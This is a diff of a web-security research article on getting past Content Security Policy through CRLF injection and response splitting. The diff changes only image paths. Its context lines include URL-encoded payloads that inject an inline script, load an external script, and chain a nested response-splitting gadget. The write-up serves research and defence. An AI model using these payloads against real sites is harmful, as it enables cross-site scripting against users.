@@ -19,11 +19,11 @@ default-src 'none'; script-src 'self';
 
 In the following example web application, it allows users to view static files and able to control the `Content-Type` of the file using GET parameter `type`. The value of parameter `type` is not validated or sanitized, which is vulnerable to CRLF injection:
 
-![](/research/articles/ArticleNo5/image1.png)
+![](/research/articles/ArticleNo0005/image1.png)
 
-![](/research/articles/ArticleNo5/image2.png)
+![](/research/articles/ArticleNo0005/image2.png)
 
-![](/research/articles/ArticleNo5/image3.png)
+![](/research/articles/ArticleNo0005/image3.png)
 
 > Note: The source code of the web application can be seen in "[Appendix 1](#appendix-1-example-web-applications-source-code)".
 
@@ -35,7 +35,7 @@ Inline script:
 /static/css/main.css?type=text/html%0d%0a%0d%0a%3Cscript%3Ealert(origin)%3C/script%3E
 ```
 
-![](/research/articles/ArticleNo5/image4.png)
+![](/research/articles/ArticleNo0005/image4.png)
 
 Load external script:
 
@@ -43,7 +43,7 @@ Load external script:
 /static/css/main.css?type=text/html%0d%0a%0d%0a%3Cscript%20src=%22http://example.com/foo.js%22%3E%3C/script%3E
 ```
 
-![](/research/articles/ArticleNo5/image5.png)
+![](/research/articles/ArticleNo0005/image5.png)
 
 If we try to use the response splitting as a CSP gadget (Nested response splitting), we'll get invalid JavaScript syntax because of the original response body data:
 
@@ -57,7 +57,7 @@ Injected response body data:
 <script src="/static/css/main.css?type=text/javascript%0d%0a%0d%0aalert(origin)"></script>
 ```
 
-![](/research/articles/ArticleNo5/image6.png)
+![](/research/articles/ArticleNo0005/image6.png)
 
 Fortunately, we can truncate the invalid syntax with different tricks!
 
@@ -80,9 +80,9 @@ Content-Length: 13
 alert(origin)
 ```
 
-![](/research/articles/ArticleNo5/image7.png)
+![](/research/articles/ArticleNo0005/image7.png)
 
-![](/research/articles/ArticleNo5/image8.png)
+![](/research/articles/ArticleNo0005/image8.png)
 
 ## Able to Control Content-Length Response Header (Very Rare)
 
